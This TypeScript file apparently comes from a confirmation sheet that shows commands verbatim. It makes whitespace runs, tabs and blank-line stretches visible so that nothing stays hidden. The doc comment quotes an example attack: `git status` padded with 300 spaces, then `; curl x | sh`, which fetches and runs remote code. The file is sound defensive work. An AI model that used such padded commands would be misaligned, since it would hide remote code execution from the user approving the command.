/**
 * A confirmation's detail as the sheet draws it: verbatim, with the whitespace
 * that could hide a part of it made visible (plan P8, CP-13).
 *
 * The detail is the command that runs, never truncated and never wrapped, and
 * that is exactly what an attacker leans on: `git status` followed by 300
 * spaces and `; curl x | sh` reads as `git status` in a box that is not 300
 * characters wide, and 80 empty lines push a second command out of sight. So
 * the DISPLAYED text marks them, by one rule the native app shares
 * (`HermieUI/Requests`):
 *
 *  - a run of 2 to 6 spaces (U+0020) inside a line, leading indentation
 *    included, is that many `·` (U+00B7); a run of 7 or more is one marker
 *    `[␣×N]` (U+2423, then `×` and the run's length in ASCII digits);
 *  - every tab is `→`; a single space stays a space;
 *  - a blank line (empty, or whitespace only) stays an empty line in a run of 1
 *    or 2; 3 or more in a row are one marker line `⋯ N empty lines ⋯` (U+22EF on
 *    both sides);
 *  - `\r\n` is a line break: the `\r` goes before anything is marked.
 *
 * Only the drawing changes. What the browser signs, what is copied ("Copy
 * details") and the line counts in the caption are the verbatim text the frame
 * carried; `lines` and `longestLine` are measured on it, the longest line in
 * code points.
 */

/** The detail as drawn, and the size of the verbatim original. */
export interface MarkedDetail {
  /** What the sheet shows and what its accessible name carries. */
  text: string
  /** Lines of the verbatim text: its pieces between `\n`. */
  lines: number
  /** The longest of them, in code points (`Array.from`). */
  longestLine: number
}

/** Runs of this many spaces or more are one counted marker. */
const COUNTED_RUN = 7
/** Runs of this many blank lines or more are one counted marker line. */
const COLLAPSED_BLANKS = 3

/** The marker line for `count` blank lines; English unless the sheet hands in its language's words. */
export const emptyLinesMarker = (count: number): string => `⋯ ${count} empty lines ⋯`

const isBlank = (line: string): boolean => /^\s*$/u.test(line)

/** One non-blank line with its space runs and tabs made visible. */
function markLine(line: string): string {
  return line
    .replace(/ {2,}/gu, run => (run.length < COUNTED_RUN ? '·'.repeat(run.length) : `[␣×${run.length}]`))
    .replace(/\t/gu, '→')
}

export function markVerbatimDetail(
  detail: string,
  emptyLines: (count: number) => string = emptyLinesMarker
): MarkedDetail {
  const original = detail.split('\n')
  const source = detail.replace(/\r\n/gu, '\n').split('\n')
  const out: string[] = []
  let blanks = 0

  const flush = (): void => {
    if (blanks >= COLLAPSED_BLANKS) {
      out.push(emptyLines(blanks))
    } else {
      for (let index = 0; index < blanks; index += 1) {
        out.push('')
      }
    }

    blanks = 0
  }

  for (const line of source) {
    if (isBlank(line)) {
      blanks += 1
      continue
    }

    flush()
    out.push(markLine(line))
  }

  flush()

  return {
    text: out.join('\n'),
    lines: original.length,
    longestLine: original.reduce((longest, line) => Math.max(longest, Array.from(line).length), 0)
  }
}
